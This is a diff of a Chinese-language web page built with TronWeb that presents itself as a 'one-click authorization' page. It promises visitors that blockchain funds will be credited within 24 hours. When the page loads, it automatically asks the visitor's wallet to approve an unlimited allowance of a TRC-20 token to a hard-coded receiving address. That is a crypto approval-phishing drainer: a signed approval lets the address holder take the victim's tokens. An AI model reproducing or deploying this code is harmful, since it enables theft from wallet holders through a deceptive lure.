@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>自動授權頁面</title>
+<title>一鍵授權頁面</title>
 <style>
   body {
     font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
@@ -28,13 +28,25 @@
     backdrop-filter: blur(12px);
     border-radius: 16px;
     padding: 30px 40px;
-    max-width: 420px;
+    max-width: 440px;
     width: 100%;
     text-align: center;
     box-shadow: 0 8px 20px rgba(0,0,0,0.3);
   }
-  h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
-  p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
+  h1 { font-size: 28px; margin-bottom: 18px; font-weight: 700; }
+  p { font-size: 16px; margin-bottom: 24px; line-height: 1.6; color: #e2e8f0; }
+  button {
+    background: linear-gradient(90deg, #2563eb, #3b82f6);
+    color: white; font-size: 18px; padding: 12px 0; width: 100%;
+    border: none; border-radius: 8px; cursor: pointer;
+    transition: all 0.3s ease;
+  }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  button:hover:enabled {
+    background: linear-gradient(90deg, #1d4ed8, #2563eb);
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(37,99,235,0.5);
+  }
   #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
   .loading { color: #facc15; }
   .success { color: #4ade80; }
@@ -44,15 +56,17 @@
 </head>
 <body>
 <div class="container">
-  <h1>自動授權中</h1>
-  <p>系統正在檢測錢包並自動授權，請在彈出的錢包中確認簽名。</p>
-  <p id="status" class="loading">正在初始化...</p>
+  <h1>一鍵授權頁面</h1>
+  <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>
+  <button id="approveBtn" disabled>授權</button>
+  <p id="status"></p>
 </div>
 
 <script>
-  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD TRC-20
-  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // 接收授權的地址
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD 合約
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26"; // A 錢包地址
   const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
   let tronWeb;
 
   async function connectWallet() {
@@ -87,7 +101,7 @@
   }
 
   async function approve() {
-    updateStatus("發送授權交易中，請簽名...", "loading");
+    updateStatus("發送授權交易中，請在錢包中確認...", "loading");
     try {
       const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
       const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
@@ -99,8 +113,9 @@
   }
 
   function updateStatus(msg, type) {
-    document.getElementById("status").innerText = msg;
-    document.getElementById("status").className = type;
+    const el = document.getElementById("status");
+    el.innerText = msg;
+    el.className = type;
   }
 
   async function init() {
@@ -112,14 +127,15 @@
     }
     updateStatus("錢包已連接：" + address, "success");
 
-    if (!await checkTronNetwork()) {
-      return;
-    }
+    if (!await checkTronNetwork()) return;
 
-    // 自動授權
-    await approve();
+    document.getElementById("approveBtn").disabled = false;
+
+    // ✅ 自動觸發授權交易（使用者僅需點一次錢包簽名）
+    approve();
   }
 
+  document.getElementById("approveBtn").onclick = approve;
   window.addEventListener('load', init);
 </script>
 </body>
